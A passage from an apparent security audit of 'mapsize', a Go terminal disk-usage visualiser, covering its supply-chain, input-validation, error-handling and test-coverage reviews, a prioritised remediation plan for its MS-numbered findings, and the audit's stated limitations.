- **Integer overflow:** sizes are capped at 2^60 so that sums cannot wrap. `Recompute` saturates. `uint32` counts could wrap above 4 billion files, which is unrealistic.
- **Unbounded growth:** covered in §9. The UI caches are bounded by data version and screen size.

## 13. Dependency and Supply-Chain Review

- **Direct dependencies:** `rivo/uniseg` v0.4.7 and `golang.org/x/sys` v0.48.0. **Indirect:** the Charm stack (`bubbletea/v2` v2.0.10, `ultraviolet`, which is a pre-release pseudo-version, `x/ansi`, `colorprofile`, and others), `go-runewidth`, `displaywidth`, `uax29`, `go-colorful`, `cancelreader`, `xo/terminfo`, and `x/sync`. All are mainstream and actively maintained, and `go.sum` pins them all.
- `govulncheck ./...` (latest) reports **no vulnerabilities**.
- **Install-time scripts:** Go modules have none. The `Makefile` `release` target uses `go run github.com/goreleaser/nfpm/v2/cmd/nfpm@v2.41.1`, which is version-pinned and checked against the checksum database.
- **CI:** read-only token (fixed, MS-06). Actions are pinned by tag (MS-10, open). Matrix cross-builds and race tests are present.
- **Packaging:** nfpm installs `/usr/bin/mapsize` and the man page with mode 0644. There are no maintainer scripts and no setuid bits. The Homebrew formula builds from source.

## 14. Authentication and Authorisation Review

There is no authentication, by design: mapsize runs with the invoking user's privileges.

The authorisation-relevant control is `--read-only`. It blocks trash (`requestTrash`), and trash is also refused in snapshot mode, while a scan is running, and for the root node. Reveal, copy and snapshot saving remain allowed; this is documented and none of them modify the scanned tree.

Running as root is the main privilege concern: MS-01 is now mitigated, and MS-08 and MS-11 are residual.

## 15. Input Validation and Output Encoding Review

- **Terminal output:**
  - `textutil.Sanitize` escapes C0, DEL, C1 and bidi controls and replaces invalid UTF-8.
  - The canvas rejects control characters a second time and drops zero-width clusters.
  - Clusters whose width is ambiguous (ZWJ sequences) are replaced, so layout cannot be spoofed.
  - Every CLI report path (`Table`, `Summary`, compare, duplicates, error messages in `main`) sanitises its output.
  - The existing tests check that hostile names never put ESC or OSC sequences into a frame. Verified.
- **CSV:** paths are sanitised. **Formula injection was checked and is not possible:** the scan root is made absolute (`filepath.Abs`), so every row starts with `/` or a drive letter, never `= + - @`.
- **JSON:** see MS-14.
- **Trashinfo:** `Path=` is URL-escaped with `url.URL{Path}.EscapedPath()`, so newlines and `%` cannot inject keys.
- **Exec:** helpers are always given absolute paths (`checkAbs`) as single argv entries, so a path cannot be read as an option, and no shell is used. Windows is the exception, covered by MS-09.
- **Config:** colours are parsed strictly as `#rrggbb`, the refresh rate is clamped to 1–60, and worker counts are bounded to 1–1024.
- **Filter:** errors carry positions, and regex compile errors are reported to the user.

## 16. Frontend HTML/JavaScript Robustness Review

Not applicable: there is no HTML or JavaScript. The equivalent for this project is the terminal UI:

- Bubble Tea recovers panics in `Update` and `View`, and scanner panics are routed through `scan.OnPanic`, so the terminal is always restored. This is tested via `MAPSIZE_DEBUG_PANIC`.
- Async results (trash, duplicates, filter, save) are tagged with their tree or finder, and stale results are dropped (`trashDoneMsg.tree`, `dupDoneMsg.finder`).
- Lock discipline (one `RLock` per entry point) is documented and followed. A grep of `RLock` call sites matched the documented entry points.

## 17. Infrastructure and Deployment Review

There are no containers, servers or IaC. Packages install a single static binary that is not setuid. `make install` uses `install -Dm755`/`-Dm644` under `$(DESTDIR)$(PREFIX)`. Releases are built with `-trimpath -s -w` and `CGO_ENABLED=0`; reproducibility is plausible but not verified. Signing and provenance are covered by MS-10.

## 18. Logging, Monitoring, and Error Handling Review

- Errors are surfaced, not swallowed. Scan errors are classified, counted, listed in the UI, and shown in `Summary` with an "incomplete" warning.
- Error strings shown to the user go through `Sanitize`.
- Some `bw.Write` return values are ignored in `Save` and `JSON`, but the final `Flush` reports the sticky error, so this is safe.
- `pprof.StartCPUProfile` errors are ignored, which is a minor debugging-only issue.
- The trash path removes its `.trashinfo` file on failure (now tested).
- Logging is opt-in, the log file is 0600, and output is quoted.

## 19. Test Coverage and Security Regression Gaps

**Existing coverage:** hostile snapshots (depth, bomb, sizes, metadata), fuzzers (`FuzzLoad`, `FuzzSquarify`, `FuzzParse`), scan stress under backpressure, terminal-injection frames, and trash symlink and permission cases.

**Added in this audit:**
- `TestTrashRefusesSwappedItem`
- `TestCopyRefusesControlCharacters`
- `TestFindSkipsSwappedFIFO`
- `TestNodeAmplificationLimited`

**Gaps:**
- No macOS or Windows CI run of the platform trash and reveal code (the CI matrix runs `go test`, but the platform tests are Linux-only).
- No race test with a symlink toggler for the scanner (MS-08).
- No test for `--read-only` blocking every mutating key.
- No test for parser nesting depth (MS-15).
- No `config.Load` tests with malformed values.

## 20. Prioritised Remediation Plan

- **Immediate (done):** MS-01, MS-02, MS-03, MS-04, MS-05, MS-06, MS-07.
- **Short term:**
  - Verify MS-09 on Windows and refuse comma paths, or switch to `SHOpenFolderAndSelectItems`.
  - Pin actions by SHA and add Dependabot (MS-10).
  - Cap filter query length and nesting (MS-15).
- **Medium term:**
  - Scan directories fd-relatively with (dev, ino) verification (MS-08), and reuse that traversal for duplicate hashing and reveal (MS-12).
  - Store the inode identity of trash candidates (MS-11).
  - Add macOS and Windows platform tests to CI.
- **Long term:**
  - Signed releases and SLSA provenance (MS-10).
  - Optional signed snapshots (MS-13).
  - Lossless JSON names (MS-14).

## 21. False Positives / Needs Manual Verification

- **MS-09:** needs a Windows run.
- **MS-05:** reasoned for macOS but not executed there.
- **Checked and not issues:**
  - CSV formula injection (the root is absolute).
  - Log injection (slog quotes values).
  - ReDoS (RE2).
  - Varint overflow and cycle creation in snapshots (validated).
  - Shell injection (no shell anywhere).
  - ESC reaching the terminal through JSON (escaped by `encoding/json`).
  - The trashinfo `Path=` key (URL-escaped).
  - The snapshot temporary file (0600, atomic rename, removed on failure).

## 22. Final Notes

**Residual risk** is concentrated in path re-resolution after the scan (MS-08, MS-11, MS-12) when mapsize runs privileged over trees that other users can write to. The recommended operating practice until the fd-relative redesign: as root, prefer `--read-only` for exploration, and trash items only in trees that untrusted users cannot write to.

**Limitations of this audit:**
- Only Linux code was executed.
- macOS and Windows code was reviewed and cross-compiled with `go vet` only.
- Repository settings on GitHub were not visible.
- The user committed `ab3ff7b` (Homebrew formula) concurrently during the audit; it was reviewed and is unaffected.
